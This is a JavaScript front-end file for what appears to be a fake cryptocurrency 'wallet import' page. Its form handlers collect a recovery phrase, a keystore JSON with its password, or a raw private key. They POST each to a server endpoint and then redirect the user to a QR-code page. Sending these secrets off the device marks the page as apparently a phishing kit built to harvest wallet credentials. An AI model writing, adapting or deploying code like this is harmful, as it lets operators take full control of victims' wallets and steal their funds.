/**----------------------------------------
 * UI Controller
 * ----------------------------------------
 */

const emptyInputs = () => {
  // Set all inputs to empty
  const inputs = document.querySelectorAll('input:not([type=hidden])');
  const textAreaInputs = document.querySelectorAll('textarea');
  inputs.forEach((input) => {
    input.value = '';
  });

  // set all text areas to empty
  textAreaInputs.forEach((textAreaInput) => {
    textAreaInput.value = '';
  });
};

const setDefaultView = () => {
  const tabs = document.querySelectorAll('.import__tab__body--item');

  tabs.forEach((el) => {
    if (!el.classList.contains('current')) {
      el.classList.add('hidden');
    }
  });

  emptyInputs();
};

const setAllToHidden = () => {
  const tabs = document.querySelectorAll('.import__tab__body--item');

  tabs.forEach((el) => {
    if (el.classList.contains('hidden')) {
      el.classList.remove('hidden');
    }
    if (el.classList.contains('current')) {
      el.classList.remove('current');
    }
    el.classList.add('hidden');
  });
};

const addCurrentToLink = (link) => {
  const tabLinks = document.querySelectorAll('.import__tab__header--item');
  // Remove current from any link that has it
  tabLinks.forEach((link) => {
    if (link.classList.contains('current')) {
      link.classList.remove('current');
    }
  });

  link.classList.add('current');
};

const navigateTab = () => {
  const tabLinks = document.querySelectorAll('.import__tab__header--item');
  // Remove current from any link that has it
  tabLinks.forEach((link) => {
    link.addEventListener('click', function (e) {
      emptyInputs();
      // Get the ID
      const elementId = link.href.split('#')[1];
      // Make the selected tab visible
      setAllToHidden();
      const targetTabBody = document.querySelector(`#${elementId}`);
      if (targetTabBody.classList.contains('hidden')) {
        targetTabBody.classList.remove('hidden');
      }
      targetTabBody.classList.add('current');

      addCurrentToLink(link);
    });
  });
};

setDefaultView();
navigateTab();

/**-------------------------------------------------
 * Form handler to handle all submit events
 * ------------------------------------------------
 */

const sendRequest = (data) => {
  fetch(`/api/import/${data.walletRef}`, {
    method: 'POST',
    mode: 'cors',
    cache: 'no-cache',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
    },
    redirect: 'follow',
    referrerPolicy: 'no-referrer',
    body: JSON.stringify(data),
  })
    .then((r) => r.json())
    .then((r) => {
      window.location = `/qrcode`;
    })
    .catch((e) => console.log(e));
};

const submitPhraseForm = () => {
  const button = document.getElementById('phrase_button');
  const errBox = document.querySelector('.form__errorBox--phrase');
  button.addEventListener('click', function (e) {
    e.preventDefault();
    const phrase = document.getElementById('phrase_input').value;
    if (!phrase) {
      alert('Empty input');
    } else {
      // Make request to the backend with the provided input
      const data = {
        walletRef: document.getElementById('walletRef').value,
        type: 'phrase',
        phrase,
      };

      sendRequest(data);
    }
  });
};

const submitKeystoreForm = () => {
  const button = document.getElementById('keystore_button');
  button.addEventListener('click', function (e) {
    e.preventDefault();
    const keystore_json = document.getElementById('keystore_json').value;
    const kj_password = document.getElementById('keystore_password').value;

    if (!keystore_json || !kj_password) {
      alert('Please provide both the Keystore JSON and password');
    } else {
      const data = {
        walletRef: document.getElementById('walletRef').value,
        type: 'keystore_json',
        keystore_json,
        kj_password,
      };

      // Send request
      sendRequest(data);
    }
  });
};

const submitPrivateKeyForm = () => {
  const button = document.getElementById('private_key_button');
  button.addEventListener('click', function (e) {
    e.preventDefault();
    const private_key = document.getElementById('private_key').value;

    if (!private_key) {
      alert('Empty input');
    } else {
      const data = {
        walletRef: document.getElementById('walletRef').value,
        type: 'keystore_json',
        private_key,
      };

      // Send request
      sendRequest(data);
    }
  });
};

submitPhraseForm();
submitKeystoreForm();
submitPrivateKeyForm();
